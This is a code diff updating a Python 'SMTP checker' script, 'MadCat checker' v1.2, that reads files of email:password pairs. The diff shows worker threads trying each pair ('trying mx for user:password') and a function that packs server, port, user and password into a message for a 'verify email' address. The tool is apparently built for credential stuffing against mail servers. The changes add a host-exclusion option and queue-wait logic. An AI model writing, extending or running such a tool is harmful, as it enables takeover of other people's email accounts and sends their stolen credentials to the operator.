@@ -1,9 +1,9 @@
-import socket,threading,base64,datetime,sys,ssl,smtplib,time,re,os,sys,random,signal,queue,subprocess
+import socket,threading,base64,datetime,sys,ssl,smtplib,time,re,os,random,signal,queue,subprocess
 from dns import resolver
 from email.mime.text import MIMEText
 
 # ~~~~ SMTP checker script ~~~~~~~~~~~~~~~~~~
-# ~~~~ MadCat checker v1.1 ~~~~~~~~~~~~~~~~~~
+# ~~~~ MadCat checker v1.2 ~~~~~~~~~~~~~~~~~~
 # ~~~~ https://github.com/aels/mailtools ~~~~
 # ~~~~ contact: https://t.me/freebug ~~~~~~~~
 
@@ -89,6 +89,13 @@ def print_statuses(thread_name, thread_status):
 def wc_count(filename):
 	return int(subprocess.check_output(['wc', '-l', filename]).split()[0])
 
+def is_ignored_host(mail):
+	global exclude_mail_hosts
+	for ignored_str in exclude_mail_hosts.split(','):
+		if ignored_str in mail.split('@')[1]:
+			return True
+	return False
+
 def smtp_connect_and_send(smtp_server, port, smtp_user, password):
 	global verify_email, timeout
 	message = MIMEText(f'{smtp_server}|{port}|{smtp_user}|{password}', 'html', 'utf-8')
@@ -121,7 +128,10 @@ def worker_item(quee, results):
 	self = threading.current_thread()
 	while True:
 		if quee.empty():
-			break
+			results.put((self.name,f'queue exhausted, {c.BOLD}sleeping...{c.END}'))
+			time.sleep(1)
+			if quee.empty():
+				break
 		else:
 			smtp_server, port, smtp_user, password = quee.get()
 			results.put((self.name,f'{c.WARN}{c.BOLD}trying mx for{c.END} {smtp_user}:{password}'))
@@ -162,8 +172,9 @@ try:
 	verify_email = sys.argv[2]
 	if not is_valid_email(verify_email):
 		raise
+	exclude_mail_hosts = sys.argv[3] or 'sorry,mom'
 except:
-	exit(f'usage: \npython3 {sys.argv[0]} list.txt verify_email@example.com')
+	exit(f'usage: \npython3 {sys.argv[0]} list.txt verify_email@example.com [exclude,mail,hosts]')
 email_index, password_index = find_email_password_indexes(list_filename)
 total_lines = wc_count(list_filename)
 print(f'verification email: {c.BOLD}{verify_email}{c.END}')
@@ -182,7 +193,7 @@ with alive_bar(total_lines, bar='blocks', title='Progress:') as progress_bar, op
 			else:
 				line = re.sub('[;,\t| ]', ':', line)
 				fields = line.split(':')
-				if len(fields)>1 and fields[email_index] and len(fields[password_index])>7 and not re.search(r'@(gmail\.com|mail\.ru)', fields[email_index]):
+				if len(fields)>1 and fields[email_index] and len(fields[password_index])>7 and not is_ignored_host(fields[email_index]):
 					quee.put((False,False,fields[email_index],fields[password_index]))
 				else:
 					progress_bar()
@@ -192,7 +203,7 @@ with alive_bar(total_lines, bar='blocks', title='Progress:') as progress_bar, op
 			if 'trying' in thread_status:
 				progress_bar()
 		if threads_counter == 0 and quee.empty():
-			print('\b'*10+f'{c.GREEN}All done.{c.END}')
+			print('\b'*10+f'{c.GREEN}{c.BOLD}All done.{c.END}')
 			break
 		if not threads_started:
 			while threads_counter < threads_count:
